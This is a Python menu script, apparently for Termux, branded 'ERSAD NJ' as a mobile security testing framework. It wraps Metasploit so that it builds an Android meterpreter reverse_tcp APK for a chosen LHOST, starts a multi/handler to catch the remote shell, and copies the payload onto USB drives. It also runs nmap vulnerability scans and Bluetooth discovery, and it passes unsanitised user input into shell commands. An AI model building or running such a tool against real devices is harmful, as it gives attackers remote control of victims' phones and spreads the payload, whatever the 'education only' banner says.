import os, sys, time, subprocess

# Neo-Cyber Colors
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
B = '\033[1;34m'
C = '\033[1;36m'
W = '\033[1;37m'
RESET = '\033[0m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

RED = '\033[91m'
BOLD = '\033[1m'
END = '\033[0m'

def banner():
    clear()
    print(f"{RED}{BOLD}")
    print(f"                 USE FOR ONLY EDOCATION PARPAS                 ")
    print(r"                                                   ")
    print(r" ███████╗██████╗ ███████╗ █████╗ ██████╗     ███╗   ██╗     ██╗")
    print(r" ██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗    ████╗  ██║     ██║")
    print(r" █████╗  ██████╔╝███████╗███████║██║  ██║    ██╔██╗ ██║     ██║")
    print(r" ██╔══╝  ██╔══██╗╚════██║██╔══██║██║  ██║    ██║╚██╗██║██   ██║")
    print(r" ███████╗██║  ██║███████║██║  ██║██████╔╝    ██║ ╚████║╚██████╔╝")
    print(r" ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ")
    print(f"                                                    ")
    print(f"{B}          ERSAD NJ — Prototype BETA")
    print(f"{C} Cross-platform mobile security testing framework")
    print(f"{W}-------------------------------------------------------")
    print(f"{W} Developed by {C}ERSAD NJ {W}• Community: {C}Termux Masters")
    print(f"{W} Tools channel: {B}t.me/ersad_tech {W}Contact: {B}@ersad_nj")
    print(f"{W}-------------------------------------------------------")

def check_pkg(cmd, pkg):
    """Auto-install logic"""
    status = subprocess.getstatusoutput(f"command -v {cmd}")
    if status[0] != 0:
        print(f"{Y}[!] Installing {pkg} for real work...{W}")
        os.system(f"pkg install {pkg} -y")

def main_menu():
    banner()
    print(f"{R}  ─────────────────── Main Menu ───────────────────")
    print(f"{W} [{G}1{W}] USB Port Scan   Detect connected USB devices")
    print(f"{W} [{G}2{W}] Sessions        Manage active processes")
    print(f"{W} [{G}3{W}] Configuration   Network & IP Config")
    print(f"{W} [{G}4{W}] Build Dropper   Create payload (msfvenom)")
    print(f"{W} [{G}5{W}] Run Payload     Execute python scripts")
    print(f"{W} [{G}6{W}] List Payloads   Show local script files")
    print(f"{W} [{G}7{W}] List Modules    Show system modules")
    print(f"{W} [{G}8{W}] List Exploits   Nmap vulnerability scan")
    print(f"{W} [{G}9{W}] Bluet-Ducky     Bluetooth Device Scan")
    print(f"{W} [{G}10{W}] OTG USB Run    Mount & Check OTG")
    print(f"{W} {R}Quit             Exit")
    print(f"{R}  ─────────────────────────────────────────────────")

def main():
    while True:
        main_menu()
        choice = input(f"\n{W}Select option: {G}")
        
        if choice == '1' or choice == '01':
            check_pkg("lsusb", "usbutils")
            print(f"\n{Y}[*] Initializing Deep USB Scan...{W}")
            print(f"{C}  " + "─"*45)
            os.system("lsusb -v 2>/dev/null | grep -e 'idVendor' -e 'idProduct' -e 'iManufacturer' -e 'iProduct'")
            print(f"{C}  " + "─"*45)
            print(f"{G}[+] Scan Complete. Checking for mountable partitions...{W}")
            os.system("lsblk")

        
        elif choice == '2' or choice == '02':
            check_pkg("nmap", "nmap")
            print(f"\n{Y}[*] Starting Real Network Discovery...{W}")
            print(f"{C}  " + "─"*50)
            
            print(f"{W} Scanning for devices on your network...{W}")
            os.system("nmap -sn 192.168.0.0/24") 
            
            print(f"{C}  " + "─"*50)
            target = input(f"\n{W}Enter a target IP to scan open ports: {G}").strip()
            
            if target:
                print(f"{Y}[*] Scanning for open vulnerabilities on {target}...{W}")
                os.system(f"nmap -F --open {target}")
            
            input(f"\n{C}Press Enter to return to menu...")

        
        elif choice == '3':
            print(f"\n{Y}[*] Network Configuration:{W}")
            os.system("ifconfig || ip addr")
        
        elif choice == '4':
            check_pkg("msfvenom", "metasploit")
            print(f"\n{Y}[*] MSFVenom ready for building...{W}")
            
            lhost_input = input(f"{W}Enter LHOST (IP only): {G}").strip()
            
            lhost = lhost_input.split(' ')[0] 
            
            print(f"{Y}[*] Generating payload for {lhost}...{W}")
            
            os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -o /sdcard/ersad_payload.apk")
            
            print(f"\n{G}[+] Success! Payload saved in Internal Storage as 'ersad_payload.apk'{W}")

        
        elif choice == '5' or choice == '05':
            check_pkg("msfconsole", "metasploit")
            print(f"\n{Y}[*] Setting up Payload Handler...{W}")
            
            lhost = input(f"{W}Enter your LHOST (IP): {G}").strip()
            print(f"{G}[+] Starting Handler on {lhost}:4444...{W}")
            
            handler_cmd = f"msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT 4444; exploit'"
            os.system(handler_cmd)

        
        elif choice == '6':
            print(f"\n{Y}[*] Available Scripts in Folder:{W}")
            os.system("ls *.py")
        
        elif choice == '7':
            print(f"\n{Y}[*] CPU & System Modules:{W}")
            os.system("lscpu")
        
        elif choice == '8':
            check_pkg("nmap", "nmap")
            target = input(f"\n{W}Enter Target IP/Domain: {G}")
            os.system(f"nmap --script vuln {target}")
        
        elif choice == '9' or choice == '09':
            check_pkg("bluetooth", "bluez")
            print(f"\n{Y}[*] Initializing Advanced Bluetooth Scan...{W}")
            print(f"{C}  " + "─"*50)
            
            print(f"{W} Scanning for visible Bluetooth devices...{W}")
            os.system("bluetoothctl --timeout 10 scan on")
            
            print(f"{C}  " + "─"*50)
            print(f"{G}[+] Scan Complete! Check the list above for MAC addresses.{W}")
            input(f"\n{C}Press Enter to return to menu...")

        
        elif choice == '10':
            print(f"\n{Y}[*] Checking for OTG/USB Connection...{W}")
            check_usb = subprocess.getoutput("df -h | grep /storage")
            
            if "/storage" in check_usb:
                print(f"{G}[+] USB Drive Detected!{W}")
                target_usb = input(f"{W}Enter USB path: {G}")
                os.system(f"cp ersad_payload.apk {target_usb}")
                print(f"{G}[+] Done! Payload copied.{W}")
            else:
                print(f"{R}[!] No USB drive found.{W}")


        elif choice.lower() == 'quit':
            print(f"\n{R}[!] Exiting...{W}")
            break
        
        else:
            print(f"\n{R}[!] Invalid Option!{W}")
        
        input(f"\n{C}Press Enter to return to menu...")

if __name__ == "__main__":
    main()
